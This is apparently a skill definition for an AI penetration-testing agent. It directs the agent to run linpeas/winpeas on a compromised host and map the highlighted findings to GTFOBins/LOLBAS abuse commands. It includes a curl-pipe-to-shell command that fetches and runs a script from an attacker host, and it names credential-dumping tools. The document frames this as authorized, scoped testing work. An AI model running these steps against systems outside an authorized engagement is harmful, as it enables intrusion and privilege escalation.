---
name: linpeas
description: >
  Use after an initial foothold to enumerate local privilege-escalation vectors on a compromised
  host with linpeas/winpeas (PEASS-ng) — SUID, capabilities, cron, creds, misconfigs, kernel —
  then turn red/yellow highlights into concrete abuse via GTFOBins/LOLBAS. Runs after a foothold
  skill; feeds the privesc exploit step. Not for remote/network enum (nmap/netexec).
arguments: "lhost_url [os]"
model: inherit
effort: medium
context: inline
agent:
category: privesc-creds
domain: host
---

# linpeas / winpeas — automated privilege-escalation enumeration (PEASS-ng)

Shared contract: see AGENTS.md.

## Goal
Surface likely local privilege-escalation vectors (SUID, caps, cron, creds, misconfigs, kernel) on a
compromised host, capture the full output, and turn the highest-signal highlights into a verified path.

## Steps
1. Identify the foothold `TARGET`. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill linpeas --target "$TARGET")"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --target "$TARGET" --run-dir "$RUN"`; nonzero STOP. linpeas is noisy/slow; record the one-shot transport.
2. Wrap the recorded timeout-bounded transport with `python3 -I scripts/otus-log.py run --run-dir "$RUN" --target "$TARGET" -- <original transport argv>`. On-target command remains `curl <lhost_url>/linpeas.sh | sh -s -- -a 2>&1 | tee /tmp/linpeas.txt` (Windows: `winPEASx64.exe > winpeas.txt`). Use only reviewed script sources; capture output locally as `linpeas.txt` and record/remove created remote artifacts with positive cleanup proof.
3. **Focus red/yellow highlights.** PEASS colour-codes the most promising findings — triage those first, not the whole dump.
4. **Cross-check vectors.** Map each candidate (SUID, writable cron, sudo rule, capability, kernel) against **GTFOBins / LOLBAS** and known CVEs for a concrete abuse command; record each + its command in `notes/vectors.md`.
5. Hand verified vector candidates to privesc-root; any extra target check uses the helper. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --item 'scope-confirmed=ok:../../scope.json' --item 'enum-captured=ok:linpeas.txt' --item 'vectors-analyzed=ok:notes/vectors.md' --item 'results-recorded=ok:findings.md'`; include actual artifact/cleanup fields and verified findings, or `none identified`.

## Modern tooling & alternatives
PEASS-ng: `linpeas.sh` (Linux), `winPEASx64.exe` (Windows). Companions: `pspy` (watch cron/processes
without root), `linux-exploit-suggester` / `wesng` (kernel/OS → known exploits). AD post-ex: `mimikatz` / `impacket secretsdump`.

## Checklist
```yaml
checklist:
  - id: scope-confirmed
    desc: Explicit engagement authorization and foothold host checked
    verify: judge
    evidence: ../../scope.json
    on_fail: fail
    required: true
  - id: enum-captured
    desc: linpeas/winpeas run and full output captured into the run directory
    verify: nonempty
    evidence: linpeas.txt
    on_fail: redo-skill
    required: true
  - id: vectors-analyzed
    desc: Highlights cross-checked against GTFOBins/LOLBAS/CVEs; candidates recorded (or "none")
    verify: nonempty
    evidence: notes/vectors.md
    on_fail: redo-part
    required: true
  - id: results-recorded
    desc: Run marker written (even when no vector found)
    verify: nonempty
    evidence: findings.md
    on_fail: redo-skill
    required: true
```

## Notes / pitfalls
- **Noisy / slow** — fine in labs, think twice in sensitive environments; `scope-confirmed` fails hard (`on_fail: fail`).
- **Don't blindly run suggested exploits** — verify each vector (version, writability, path) first; kernel exploits can crash the host.
- Triage red/yellow highlights, not the whole dump — then map to a concrete GTFOBins/LOLBAS command. `pspy` catches root cron/processes a one-shot run can miss.
- No vector still records `none` in notes/vectors.md and finishes with the matching summary.
